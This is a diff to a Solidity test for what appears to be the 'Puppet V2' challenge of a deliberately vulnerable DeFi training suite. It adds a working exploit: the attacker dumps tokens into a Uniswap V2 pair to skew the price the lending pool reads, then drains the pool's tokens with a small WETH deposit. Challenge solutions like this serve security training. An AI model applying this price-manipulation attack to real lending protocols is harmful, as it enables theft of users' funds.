@@ -42,7 +42,6 @@ contract PuppetV2 is Test {
         attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
         vm.label(attacker, "Attacker");
         vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);
-
         deployer = payable(address(uint160(uint256(keccak256(abi.encodePacked("deployer"))))));
         vm.label(deployer, "deployer");
 
@@ -54,9 +53,12 @@ contract PuppetV2 is Test {
         vm.label(address(weth), "WETH");
 
         // Deploy Uniswap Factory and Router
+        //uniswapV2Factory = new UniswapV2Factory(address(0));
+
         uniswapV2Factory =
             IUniswapV2Factory(deployCode("./src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));
 
+        
         uniswapV2Router = IUniswapV2Router02(
             deployCode(
                 "./src/build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth))
@@ -95,7 +97,7 @@ contract PuppetV2 is Test {
         assertEq(puppetV2Pool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
 
         assertEq(puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300_000 ether);
-
+        
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
@@ -103,7 +105,24 @@ contract PuppetV2 is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        //turn ether into weth
+        weth.deposit{value: 19.5 ether}();
+        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
 
+        //create and array with dvt and eth addresses
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+
+        uniswapV2Router.swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE, 1 ether, path, address(attacker), DEADLINE
+        );
+
+        weth.approve(address(puppetV2Pool), 20 ether);
+
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
